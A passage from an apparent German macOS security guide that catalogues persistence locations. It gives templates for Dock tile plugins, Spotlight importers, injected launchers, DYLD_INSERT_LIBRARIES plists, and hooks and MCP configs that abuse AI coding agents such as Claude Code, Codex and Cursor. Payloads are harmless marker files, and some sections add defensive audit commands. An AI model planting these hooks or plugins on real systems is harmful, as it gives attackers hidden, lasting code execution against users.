2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> Beachte, dass du dich **innerhalb der allgemeinen App-Sandbox** befindest, da in den Entitlements der Binärdatei, die diesen Code lädt (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`), **`com.apple.security.app-sandbox`** zu finden ist.

Bildschirmschoner-Code:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Spotlight-Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
  - Du landest jedoch in einer Application-Sandbox
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Die Sandbox scheint sehr eingeschränkt zu sein

#### Speicherort

- `~/Library/Spotlight/`
  - **Auslöser**: Eine neue Datei mit einer vom Spotlight-Plugin verwalteten Erweiterung wird erstellt.
- `/Library/Spotlight/`
  - **Auslöser**: Eine neue Datei mit einer vom Spotlight-Plugin verwalteten Erweiterung wird erstellt.
  - Root erforderlich
- `/System/Library/Spotlight/`
  - **Auslöser**: Eine neue Datei mit einer vom Spotlight-Plugin verwalteten Erweiterung wird erstellt.
  - Root erforderlich
- `Some.app/Contents/Library/Spotlight/`
  - **Auslöser**: Eine neue Datei mit einer vom Spotlight-Plugin verwalteten Erweiterung wird erstellt.
  - Neue App erforderlich

#### Beschreibung & Exploitation

Spotlight ist die integrierte Suchfunktion von macOS, die Nutzern **schnellen und umfassenden Zugriff auf Daten auf ihren Computern** ermöglichen soll.\
Um diese schnelle Suche zu ermöglichen, verwaltet Spotlight eine **proprietäre Datenbank** und erstellt einen Index, indem es **die meisten Dateien analysiert**. So lassen sich sowohl Dateinamen als auch deren Inhalte schnell durchsuchen.<sup>[[25]](#references)</sup>

Der zugrunde liegende Mechanismus von Spotlight umfasst einen zentralen Prozess namens „mds“, was für **„metadata server“** steht. Dieser Prozess steuert den gesamten Spotlight-Dienst. Zusätzlich gibt es mehrere „mdworker“-Daemons, die verschiedene Wartungsaufgaben ausführen, beispielsweise die Indizierung unterschiedlicher Dateitypen (`ps -ef | grep mdworker`). Möglich werden diese Aufgaben durch Spotlight-Importer-Plugins oder **„.mdimporter bundles“**, mit denen Spotlight Inhalte verschiedenster Dateiformate verstehen und indizieren kann.

Die Plugins oder **`.mdimporter`**-Bundles befinden sich an den zuvor genannten Orten. Ein neues Bundle muss erkannt werden und zu einem Dateityp passen. Außerdem muss Spotlight tatsächlich eine passende Datei indizieren; das bloße Kopieren eines Bundles belegt nicht, dass es geladen wurde. [Apples MDImporter-Referenz](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter) verknüpft das Laden mit einer geeigneten geänderten Datei. Die Ausführung von Spotlight-Importern unter macOS 26 wurde hier nicht getestet.

Es ist möglich, **alle geladenen `mdimporters`** zu finden, indem man Folgendes ausführt:

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

Und beispielsweise wird **/Library/Spotlight/iBooksAuthor.mdimporter** verwendet, um diese Dateitypen zu parsen (unter anderem mit den Erweiterungen `.iba` und `.book`):

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> Wenn du die Plist eines anderen `mdimporter` überprüfst, findest du möglicherweise keinen Eintrag **`UTTypeConformsTo`**. Das liegt daran, dass es sich dabei um einen integrierten _Uniform Type Identifier_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) handelt, für den keine Erweiterungen angegeben werden müssen.
>
> Außerdem haben systemeigene Plugins immer Vorrang. Ein Angreifer kann daher nur auf Dateien zugreifen, die nicht bereits von Apples eigenen `mdimporters` indexiert werden.

Um einen eigenen Importer zu erstellen, kannst du mit diesem Projekt beginnen: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer). Ändere dann den Namen und **`CFBundleDocumentTypes`** und füge **`UTImportedTypeDeclarations`** hinzu, damit der Importer die gewünschte Erweiterung unterstützt. Ergänze diese außerdem in **`schema.xml`**.\
Ändere anschließend den Code der Funktion **`GetMetadataForFile`**, damit deine Payload ausgeführt wird, wenn eine Datei mit der verarbeiteten Erweiterung erstellt wird.

Zum Schluss **erstelle und kopiere deinen neuen `.mdimporter`** an einen der drei zuvor genannten Speicherorte. Du kannst überprüfen, ob er geladen wurde, indem du **die Logs überwachst** oder **`mdimport -L`** ausführst.

> [!TIP]
> Obwohl die Sandbox des Importers sehr restriktiv ist, indexiert `mdworker` Dateien mit **privilegiertem Lesezugriff**. Ein bösartiger `.mdimporter` kann daher den *Inhalt* von Dateien an durch TCC geschützten Speicherorten (Downloads, Bilder, Schreibtisch, …) lesen und erfasste Metadaten ohne TCC-Abfrage exfiltrieren — der **„Sploitlight“-TCC-Bypass (CVE-2025-31199)**, der in macOS Sequoia 15.4 behoben wurde.<sup>[[55]](#references)</sup>

### ~~Einstellungsbereich~~

> [!CAUTION]
> Es sieht so aus, als würde das nicht mehr funktionieren.

Write-up: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Erfordert eine bestimmte Benutzeraktion
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Beschreibung

Es sieht so aus, als würde das nicht mehr funktionieren.<sup>[[26]](#references)</sup>

### Anwendungsskriptdateien

Write-up: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Die Zielanwendung muss jedoch installiert sein und vom Opfer ausgeführt/verwendet werden
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

Ein **interpretiertes Skript, das eine installierte Anwendung oder ein Tool tatsächlich ausführt** und das der Angreifer ändern kann. Überprüfe die Dateiberechtigungen und den aufrufenden Pfad; eine `.sh`- oder `.py`-Datei allein zu finden, reicht nicht aus. Apples [Code-Signing-Leitfaden](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html) besagt, dass signierte App-Bundles Ressourcen einschließlich Skripten versiegeln. Wird ein Skript innerhalb des Bundles bearbeitet, wird diese Versiegelung ungültig; dies kann erkannt oder bei der Validierung des Bundles blockiert werden. Ein externes Skript wie der Launcher von Homebrew unterliegt anderem Signatur- und Vertrauensverhalten. Zu den historischen Beispielen aus dem Write-up gehören:

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** – ein Skript, das ältere Sublime-Text-Versionen verwendeten; für die installierte Version müssen die Datei und ihre Verwendung beim Start überprüft werden. Auf dem Test-Mac war es nicht vorhanden.
- **`/opt/homebrew/bin/brew`** (Apple Silicon) oder **`/usr/local/bin/brew`** (Intel) – ein Bash-Launcher, der ausgeführt wird, wenn der jeweilige `brew`-Pfad aufgerufen wird, sofern er installiert und für den Angreifer beschreibbar ist. Auf dem Test-Mac war `/opt/homebrew/bin/brew` ein beschreibbares Bash-Skript; dies ist eine lokale Beobachtung und keine allgemeine Berechtigungsregel für Homebrew.
- **`idlemain.py` von IDLE** innerhalb eines Python-App-Bundles – zum Schreiben sind möglicherweise Administratorrechte erforderlich, wird aber mit der Identität des IDLE-Benutzers ausgeführt.
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** – ein historisches Shell-Skript, das als root ausgeführt wird, wenn der zugehörige `org.wireshark.ChmodBPF`-launchd-Job installiert ist. Das Skript und der Job waren auf dem Test-Mac nicht vorhanden.

#### Beschreibung und Ausnutzung

Einige Tools und Apps führen zur Laufzeit interpretierte Skripte aus. Ein beschreibbares Skript kann zusätzliche Befehle ausführen, wenn der zugehörige Aufrufer das nächste Mal gestartet wird, sofern Signaturvalidierung, Quarantäne und andere Prüfungen dies zulassen. Die ursprüngliche Forschung demonstrierte mehrere Installationen aus dem Jahr 2019; überprüfe ihre Pfade und Auslöser für die Zielversion erneut.<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

Dieser Kopiertest ergab `marker fired: True` unter macOS 26.5.2; der ursprüngliche Launcher blieb unverändert. Er beweist, dass der Einfügepunkt in der Kopie ausgeführt wird, nicht aber, dass ein modifiziertes signiertes App-Bundle oder eine echte Homebrew-Installation alle Startprüfungen bestehen würde.

### Dock Tile-Plugins

Bericht: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Erfordert eine App, die das Plugin deklariert, damit es vom Dock gefunden/registriert und verarbeitet wird
  - Das Plugin wird in einen **von Apple signierten** Helper geladen, der kein App-Sandbox-Entitlement hat und bei dem die **Library Validation deaktiviert** ist. Dieser Helper wurde in der in der zitierten Recherche beschriebenen Benutzeroberfläche „Hintergrundobjekte“ nicht angezeigt; die Sichtbarkeit unter der jeweiligen Zielversion sollte überprüft werden.
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**, referenziert über den Schlüssel **`NSDockTilePlugIn`** in der `Info.plist` der App; die eigene `Info.plist` des Plugins setzt **`NSPrincipalClass`**.

#### Beschreibung & Ausnutzung

Wenn eine App `NSDockTilePlugIn` deklariert, kann das Dock das referenzierte Bundle beim Anmelden oder beim Hinzufügen des App-Kachels in den XPC-Helper **`com.apple.dock.external.extra`** laden (auf Apple Silicon **`...extra.arm64`**); die App selbst muss nicht gestartet werden. Dazu muss die App von macOS gefunden/registriert und akzeptiert werden. Der Helper ist **von Apple signiert**, hat kein `com.apple.security.app-sandbox`-Entitlement und verfügt über `com.apple.security.cs.disable-library-validation`. Die Methode **`setDockTile:`** der Hauptklasse wird beim Laden aufgerufen; von dort aus kann sie sich für spätere Ereignisse bei verteilten Benachrichtigungen (z. B. `com.apple.screenIsLocked`) anmelden.<sup>[[38]](#references)</sup>

Unter macOS 26.5.2 bestätigte eine Nur-Lese-Prüfung mit `codesign` die Apple-Signatur und die Entitlements des Helpers; außerdem deklarierten mehrere installierte Apps `NSDockTilePlugIn`. Auf diesem Mac wurde kein neues Plugin installiert oder geladen. Daher ist die Ausführung eines neu geschriebenen Bundles unter dieser Version weiterhin ungeprüft.

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### Widgets (Notification Center / WidgetKit)

Writeup: [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Die Widget-Erweiterung läuft in ihrem **eigenen Prozess**, und das Hinzufügen einer solchen löst **keine** Background Task Management-Warnung aus
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Die Konfigurations-PLIST befindet sich in einem TCC-geschützten Container. Um sie von außerhalb zu bearbeiten, ist daher Full Disk Access oder ein TCC bypass erforderlich

#### Speicherort

- Widget-Erweiterungs-Bundle: **`<App>.app/Contents/PlugIns/<Widget>.appex`**
- Aktive/registrierte Widgets: **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`** (Schlüssel `widgets.instances` und `widgets.widgets`)

#### Beschreibung und Ausnutzung

Eine in einer App ausgelieferte WidgetKit-Erweiterung läuft in **ihrem eigenen Prozess**, der vom Notification Center verwaltet wird. Wenn eine Instanz in `widgets.instances` registriert wird (ein base64-kodierter `NSKeyedArchiver`-`CHSWidget`-Blob mit eingebetteten `INIntent`-Daten) und NotificationCenter neu gestartet wird, wird das Widget geladen und führt seinen `TimelineProvider`-/Intent-Code aus.<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Mail.app-Regeln (Run AppleScript)

Writeup: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - Mail.app muss jedoch mit einem eingerichteten Account laufen; der Auslöser ist eine eingehende E-Mail
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Wenn die Regeln/Scripts außerhalb von Mail bearbeitet werden, muss Mail möglicherweise geschlossen sein; unter aktuellen macOS-Versionen ist außerdem Full Disk Access erforderlich

#### Speicherort

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`** (lokale Regeln; `V10` unter Sonoma/Sequoia, `V11`+ unter neueren Versionen)
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`** (iCloud-synchronisierte Regeln, haben Vorrang)
- Aktivierung der Regeln: **`RulesActiveState.plist`**; AppleScript-Payload: **`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### Beschreibung und Ausnutzung

Eine Apple-Mail-**Regel** kann die Aktion *„Run AppleScript“* enthalten. Fügt man eine Regel hinzu, die auf eine speziell gestaltete **Betreffzeile** passt und ein Angreifer-Script ausführt, erhält der Angreifer im Kontext von Mail eine **remote auslösbare, unauffällige** Codeausführung, sobald die passende E-Mail eintrifft — ein Angriffsvektor, der viele Persistence-Scanner umgeht, da kein LaunchAgent/Login Item erstellt wird.<sup>[[42]](#references)</sup> Wird die Regel so konfiguriert, dass sie die Auslöser-E-Mail auch **löscht**, werden die Spuren verborgen. Verteidiger können gezielt danach suchen:<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### Konfigurationsprofile (.mobileconfig)

Write-up: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [🔴](https://emojipedia.org/large-red-circle)
  - Moderne macOS-Versionen erfordern eine **manuelle Benutzerfreigabe** unter Systemeinstellungen → *Geräteverwaltung* (stilles `profiles install` ist außerhalb von MDM nicht mehr möglich)
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- Installierte Profile befinden sich unter **`/Library/Managed Preferences/`** und **`/var/db/ConfigurationProfiles/`**; ein Profil ist eine XML-plist mit einem `PayloadContent`-Array.

#### Beschreibung & Exploitation

Eine `.mobileconfig` ist kein direktes Code-Execution-Primitiv, kann aber Konfigurationen wie eine **vertrauenswürdige Root-CA** (`com.apple.security.root`), einen **globalen oder PAC-Proxy** (`com.apple.proxy.*`), **verwaltete Einstellungen** (`com.apple.ManagedClient.preferences`) oder Einschränkungen dauerhaft speichern. Unter macOS 10.15 und neuer besagt Apples Definition von [`PayloadRemovalDisallowed`](https://developer.apple.com/documentation/devicemanagement/toplevel), dass die Einstellung auf `true` bei einem **manuell installierten** Profil ohne Payload für ein Entfernungskennwort eine **Administratorauthentifizierung** zum Entfernen erfordert; dadurch wird das Profil nicht absolut unentfernbar. Für per MDM installierte Profile gelten eigene Verwaltungs- und Entfernungsregeln.<sup>[[44]](#references)</sup>

> [!WARNING]
> Ein einfaches Konfigurationsprofil hat **keinen Payload-Typ, der beliebige `LaunchDaemon`/`LaunchAgent` installiert**. Die Installation eines Daemons auf diesem Weg erfordert eine vollständige **MDM-Registrierung** sowie einen Management-Agent/ein Skript — `.mobileconfig` darf nicht als Bereitstellungsmechanismus für launchd betrachtet werden.

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### DYLD_INSERT_LIBRARIES Persistence

- Nützlich, um sandbox zu umgehen: [🔴](https://emojipedia.org/large-red-circle)
  - dyld **entfernt** `DYLD_*` bei SIP-/Plattform-Binaries, Apps mit hardened runtime und setuid-Zielen. Daher injiziert es nur in ungeschützte Prozesse und umgeht **nicht** SIP/die hardened runtime
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- Zuverlässige Variante: das **`EnvironmentVariables`**-Dict in einer bösartigen `LaunchAgent`-/`LaunchDaemon`-plist (wird bei Login/Boot ausgeführt)
- Veraltet/historisch (nur der Vollständigkeit halber): **`~/.MacOSX/environment.plist`** (in 10.8 entfernt) und **`/etc/launchd.conf`** (in 10.10 entfernt)

#### Beschreibung & Ausnutzung

Wenn ein Angreifer `DYLD_INSERT_LIBRARIES` in die Umgebung eines Opferprozesses einbringen kann, lädt dyld die dylib des Angreifers in diesen Prozess (ihr constructor wird ausgeführt). Die persistente Variante bettet die Variable in einen LaunchAgent ein, sodass jeder Start des Jobs die Injektion erneut ausführt. Beachte, dass `launchctl setenv DYLD_*` unter modernen macOS-Versionen gefiltert wird. Daher sollte die Variable stattdessen in die plist eingebettet werden.<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

For the full mechanics of dylib injection/hijacking see:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### CLI-Tools für AI-Coding-Agents (Hooks, MCP-Server, Regeldateien)

Berichte: [CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>, [Hintertür in Regeldatei (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - Erfordert, dass der Entwickler den entsprechenden Agent verwendet. Startbefehle werden mit den Berechtigungen dieses Benutzers ausgeführt, sobald der Agent die Konfiguration akzeptiert; Workspace-Vertrauen und MCP-Genehmigungen unterscheiden sich je nach Produkt und Sitzungsmodus.
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle) (wird als Benutzer ausgeführt; erbt alle Berechtigungen, die das Terminal/der Agent bereits besitzt)

#### Speicherort

Explizite Hook- und MCP-Konfigurationsdateien können bewirken, dass **Shell-Befehle oder Kindprozesse ausgeführt werden, wenn der Entwickler das Tool verwendet** — entweder aus einer globalen benutzerspezifischen Datei (Persistenz) oder aus einer in einem Repository eingecheckten Datei (Supply-Chain). `CLAUDE.md`, `AGENTS.md`, `GEMINI.md` und Editor-Regeln sind **Anweisungen an einen Agenten**, deren Lesen keine garantierte Shell-Ausführung auslöst; ihre Wirkung hängt vom Verhalten des Agenten und seinen Tool-Berechtigungen ab. Prüfen Sie die aktuellen Vertrauens- und Genehmigungsregeln für jedes Produkt.

- **Claude Code**
  - `~/.claude/settings.json`, projektbezogen `.claude/settings.json`, `.claude/settings.local.json` und die nur für root zugängliche **`/Library/Application Support/ClaudeCode/managed-settings.json`** (MDM-/verwaltete Einstellungen **können nicht vom Benutzer überschrieben werden** → starke Persistenz)
  - `hooks`-Objekt — Ereignisse `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`, `SubagentStop`, `SessionStart`, `SessionEnd`, `Notification`, `PreCompact` — jedes führt einen Shell-`command` aus
  - `statusLine.command` — ein Shell-Befehl, der zum Anzeigen der Statuszeile ausgeführt wird (in jeder Sitzung)
  - MCP-Server in `~/.claude.json` / projektbezogen `.mcp.json` — `command`+`args` werden als Kindprozesse gestartet
  - `CLAUDE.md` / `~/.claude/CLAUDE.md` — Anweisungen, die eine Prompt Injection versuchen können, abhängig vom Verhalten des Agenten und den Tool-Berechtigungen
- **OpenAI Codex CLI**: `~/.codex/config.toml` `[mcp_servers.*]` (`command`/`args` werden als Kindprozesse gestartet); Projektanweisungen in `AGENTS.md`
- **Gemini CLI**: `~/.gemini/settings.json` (`hooks`, MCP-Server); `GEMINI.md`
- **Cursor**: `~/.cursor/hooks.json` (`beforeShellExecution`, `afterAgentResponse`, `stop`, … führen Befehle aus); `.cursor/rules/`, `.cursorrules`, `~/.cursor/mcp.json`; GitHub Copilot `.github/copilot-instructions.md`

#### Beschreibung & Ausnutzung

Kann ein Angreifer die globalen Benutzereinstellungen des Kontos ändern, können dessen Hook- oder MCP-Befehle in künftigen Sitzungen unter diesem Konto ausgeführt werden. Eine vom Repository kontrollierte Konfiguration ist ein anderer Fall: Die [aktuellen Sicherheitsdokumente von Claude Code](https://code.claude.com/docs/en/security) beschreiben einen interaktiven Dialog zum Vertrauen in den Workspace sowie eine separate Genehmigungsabfrage für Server in der projektbezogenen `.mcp.json`. Laut der [Berechtigungsmatrix](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder) können Hooks ausgeführt werden, nachdem einem übergeordneten Ordner vertraut wurde; `claude -p`-/SDK-Sitzungen zeigen keine interaktive Vertrauensabfrage an. In diesen nicht interaktiven Modi verbinden sich projektbezogene MCP-Server ohne Genehmigungsabfrage. Der vor dem Vertrauen ausgelöste Bypass für Projekt-Hooks, der als CVE-2025-59536 gemeldet wurde, wurde [2025 behoben](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/); betrachten Sie ihn nicht als aktuelles Standardverhalten. Zu den Verbreitungswegen können ein kompromittiertes Repository oder ein bösartiger Installer gehören. Prompt Injection über Regeldateien ist weniger vorhersehbar als ein expliziter Hook und hängt weiterhin von Tool-Genehmigungen ab.<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

Beispiel für globale Claude Code-Benutzereinstellungen; verwenden Sie dies beim Testen nur in einem entbehrlichen Konto:

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

Beispiel für eine benutzerweite Codex-MCP-Konfiguration:

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

Beispiel einer Cursor-Hook-Konfiguration; prüfe vor der Verwendung das Schema der installierten Version:

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### Browser Extensions (Chromium: Chrome / Brave / Edge)

Writeup: [Chrome external extensions](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>, [Missbrauch von ExtensionInstallForcelist auf macOS](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - Erfordert einen unterstützten Browser und eine installierte, aktivierte Erweiterung. External Extensions auf macOS erfordern eine Bestätigung durch den Benutzer; eine verwaltete Zwangsinstallation erfordert eine entsprechende Unternehmensrichtlinie.
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> Dies unterscheidet sich von **native messaging hosts** (siehe den Abschnitt *Chrome native messaging hosts* oben). Hier besteht die Persistenz in der **automatisch installierten Erweiterung** selbst.

#### Speicherort

- **External Extensions JSON** (wird beim Browserstart erkannt und erfordert dann eine Aktivierungsaufforderung unter macOS):
  - Chrome: `~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json` (benutzerspezifisch) oder `/Library/Application Support/Google/Chrome/External Extensions/` (alle Benutzer)
  - Brave: `~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge: `~/Library/Application Support/Microsoft Edge/External Extensions/`
- **Zwangsinstallation über Unternehmensrichtlinien** mittels verwalteter Einstellungen / eines Konfigurationsprofils:
  - Schlüssel `ExtensionInstallForcelist` von `com.google.Chrome` (Brave `com.brave.Browser`, Edge `com.microsoft.Edge`), aus `/Library/Managed Preferences/` oder einer installierten `.mobileconfig` gelesen

#### Beschreibung & Ausnutzung

